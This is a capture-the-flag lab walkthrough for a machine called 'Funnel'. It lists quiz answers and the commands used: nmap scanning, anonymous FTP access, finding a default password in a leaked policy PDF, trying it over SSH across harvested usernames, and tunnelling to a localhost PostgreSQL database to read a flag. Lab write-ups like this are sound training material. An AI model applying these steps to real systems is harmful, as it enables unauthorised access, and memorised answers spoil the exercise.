## 1. Questions
- Task 1
	- How many TCP ports are open?
		- `2`
- Task 2
	- What is the name of the directory that is available on the FTP server?
		- `mail_backup`
- Task 3
	- What is the default account password that every new member on the "Funnel" team should change as soon as possible?
		- `funnel123#!#`
- Task 4
	- Which user has not changed their default password yet?
		- `christine`
- Task 5
	- Which service is running on TCP port 5432 and listens only on localhost?
		- `postgresql`
- Task 6
	- Since you can't access the previously mentioned service from the local machine, you will have to create a tunnel and connect to it from your machine. What is the correct type of tunneling to use? remote port forwarding or local port forwarding?
		- `local port forwarding`
- Task 7
	- What is the name of the database that holds the flag?
		- `secrets`
- Task 8
	- Could you use a dynamic tunnel instead of local port forwarding? Yes or No.
		- `Yes`
- Submit Flag
	- Submit root flag
## 2. Tools
- Linux
- CLI
- nmap
- ftp
- lftp
- tnftp
- file
- pdftotext
- ssh
- netstat
- psql
- sql
## 2. Process
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.113.61
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.85
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
<snip>
```
### Research common usernames
- https://hackviser.com/tactics/pentesting/services/ftp#anonymous-authentication
- https://hackviser.com/tactics/pentesting/services/ftp#common-credentials
### Test ftp connection (passwordless)
- Useful resource
	- https://cheatsheet.haax.fr/network/services-enumeration/21_ftp/
	- https://lftp.yar.ru/lftp-man.html
	- https://www.mankier.com/1/tnftp
- Test usernames
	- `anonymous`
	- `admin`
	- `administrator`
	- `root`
	- `ftpuser`
	- `test`
- Successfully connected using username `anonymous`
```bash
ftp anonymous@10.129.113.61
lftp anonymous@10.129.113.61
tnftp anonymous@10.129.113.61
```
### Explore files and directories
- Useful resource
	- https://hackviser.com/tactics/pentesting/services/ftp#common-ftp-commands
#### Login directory
- Check available files/directories
```bash
ls -al
```
- One directory found
```bash
<snip>
drwxr-xr-x    2 ftp      ftp          4096 Nov 28  2022 mail_backup
<snip>
```
#### mail_backup directory
- Check available files/directories
```bash
cd mail_backup
ls -al mail_backup
```
- 2 files found
```
<snip>
-rw-r--r--    1 ftp      ftp         58899 Nov 28  2022 password_policy.pdf
-rw-r--r--    1 ftp      ftp           713 Nov 28  2022 welcome_28112022
<snip>
```
### Copy remote files
- Useful resource
	- https://hackviser.com/tactics/pentesting/services/ftp#common-ftp-commands
```bash
get password_policy.pdf
get welcome_28112022
```
### Review file type
- Useful resource
	- https://www.geeksforgeeks.org/linux-unix/file-command-in-linux-with-examples/
#### welcome_28112022
```bash
file welcome_28112022
```
- Result
```bash
welcome_28112022: Unicode text, UTF-8 text
```
#### password_policy.pdf
```bash
file password_policy.pdf
```
- Result
```bash
password_policy.pdf: PDF document, version 1.3, 1 pages
```
### Review File Contents
#### welcome_28112022
```bash
cat welcome_28112022
```
- Key Result Elements
```bash
Frome: root@funnel.htb
To: optimus@funnel.htb albert@funnel.htb andreas@funnel.htb christine@funnel.htb maria@funnel.htb
Subject:Welcome to the team!

<snip>
```
#### password_policy.pdf
- Useful resource
	- https://linux.die.net/man/1/pdftotext
- Convert to txt file
```bash
pdftotext password_policy.pdf
```
- Print contents
```bash
cat password_policy.txt
```
- Key result elements
```bash
<snip>
• Default passwords — such as those created for new users — must be changed as quickly as possible. For example the default password of “funnel123#!#” must be changed immediately.
<snip>
```
### Test ssh connection
- Test Usernames (from `welcome_28112022`)
	- `root`
	- `optimus`
	- `albert`
	- `andreas`
	- `christine`
	- `maria`
- Test Password (from `password_policy.pdf`)
	- `funnel123#!#`
- Successfully connected with username `christine`
```bash
ssh christine@10.129.113.61
```
### Review Directory Contents
- No content of value
### Check if part of sudoers group
- Useful resource
	- https://stackoverflow.com/questions/64848619/how-to-check-if-user-has-sudo-privileges-inside-the-bash-script
```bash
sudo -l
```
- Result
```bash
Sorry, user christine may not run sudo on funnel.
```
### Check running services
- Useful resource
	- https://bashsenpai.com/resources/cheatsheets/netstat
```bash
netstat -tulnpev
```
- Key result
```
# Output
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -                
```
### Test postgres connection
- Useful resources
	- https://www.digitalocean.com/community/tutorials/ssh-port-forwarding
	- https://www.geeksforgeeks.org/postgresql/postgresql-psql-commands/
#### Terminal 1 - Setup ssh tunnel
- Use password `funnel123#!#` when prompted
```bash
ssh -L 5432:localhost:5432 christine@10.129.113.61
```
#### Terminal 2 - Connect to postgres service
- Use password `funnel123#!#` when prompted
```bash
psql -h localhost -U christine -l
```
- Key result
```bash
   Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges    
-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------
<snip>
secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
<snip>
```
### Connection to database
- Useful resources
	- https://www.digitalocean.com/community/tutorials/ssh-port-forwarding
	- https://hackviser.com/tactics/pentesting/services/ssh#port-forwarding
	- https://www.geeksforgeeks.org/postgresql/postgresql-psql-commands/
#### Terminal 1 - Setup ssh tunnel
- Use password `funnel123#!#` when prompted
```bash
ssh -L 5432:localhost:5432 christine@10.129.113.61
```
#### Terminal 2 - Connect to database
- Use password `funnel123#!#` when prompted
```psql
psql -h localhost -U christine -d secrets
```
### List database contents
- Useful resource
	- https://www.geeksforgeeks.org/postgresql/postgresql-psql-commands/
```postgres
\dt
```
- Result
```postgres
List of relations
 Schema | Name | Type  |   Owner   
--------+------+-------+-----------
 public | flag | table | christine
```
### Get all of the table's contents
- Useful resource
	- https://www.datacamp.com/cheat-sheet/sql-basics-cheat-sheet#:~:text=Get%20all%20the%20columns%20from%20a%20table
```postgres
SELECT * FROM flag;
```
